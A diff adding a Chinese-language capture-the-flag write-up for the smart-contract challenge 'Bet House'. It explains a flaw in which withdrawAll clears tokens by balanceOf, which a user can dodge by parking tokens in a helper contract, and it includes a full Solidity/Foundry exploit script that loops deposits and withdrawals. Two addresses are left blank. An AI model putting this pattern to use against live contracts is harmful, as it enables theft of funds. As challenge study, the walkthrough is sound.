@@ -764,3 +764,66 @@ contract Attack {
     }
 }
 ```
+## Bet House
+
+没有什么神秘技巧，这题完全是逻辑问题
+
+deposit函数拿走用户输入的`value_`个depositToken，并在depositedPDT里记录拿走的数量；同时给用户相同数量的wrappedToken
+
+withdrawAll函数将depositedPDT记录的数量清零，并将记录的depositToken原封不动地还给用户；同时清空用户wrappedToken的余额
+
+初始有5个depositToken，目标是拿到20个wrappedToken
+
+上述内容之外的东西都是干扰项。bug其实挺直白的：清空用户的wrappedToken时用的是`balanceOf(msg.sender)`，这个值是不可信的，用户可以通过将token转给别人来修改这个值。只要在每次调用withdrawAll前把自己拥有的wrappedToken全转走，就能来回倒腾那5个depositToken且不损失wrappedToken
+
+```solidity
+contract AttackScript is Script {
+    function run() public {
+        vm.startBroadcast();
+        address externalAccount=;
+        BetHouse target=BetHouse(address());
+        Pool pool=Pool(target.pool());
+        PoolToken depositToken=PoolToken(pool.depositToken());
+        PoolToken wrappedToken=PoolToken(pool.wrappedToken());
+        TokenHelper helper=new TokenHelper(address(wrappedToken));
+        Attack atk=new Attack(address(target),address(pool),address(wrappedToken),address(depositToken),address(helper));
+        depositToken.transfer(address(atk), depositToken.balanceOf(externalAccount)); //上方的startBroadcast表示以外部账号身份调用
+        atk.exploit();
+        vm.stopBroadcast();
+    }
+}
+contract Attack {
+    BetHouse target;
+    PoolToken depositToken;
+    PoolToken wrappedToken;
+    Pool pool;
+    TokenHelper helper;
+    constructor(address target_,address pool_, address wrappedToken_, address depositToken_, address helper_) {
+        target=BetHouse(target_);
+        depositToken=PoolToken(depositToken_);
+        wrappedToken=PoolToken(wrappedToken_);
+        pool=Pool(pool_);
+        helper=TokenHelper(helper_);
+    }
+    function exploit() public {
+        depositToken.approve(address(pool),20);
+        for(uint256 i=0;i<4;i++){
+            pool.deposit(depositToken.balanceOf(address(this)));
+            wrappedToken.transfer(address(helper),wrappedToken.balanceOf(address(this)));
+            pool.withdrawAll();
+            helper.transfer();
+        }
+        pool.lockDeposits();
+        target.makeBet();
+    }
+}
+contract TokenHelper {
+    PoolToken wrappedToken;
+    constructor(address wrappedToken_) {
+        wrappedToken = PoolToken(wrappedToken_);
+    }
+    function transfer() public {
+        wrappedToken.transfer(msg.sender,wrappedToken.balanceOf(address(this)));
+    }
+}
+```
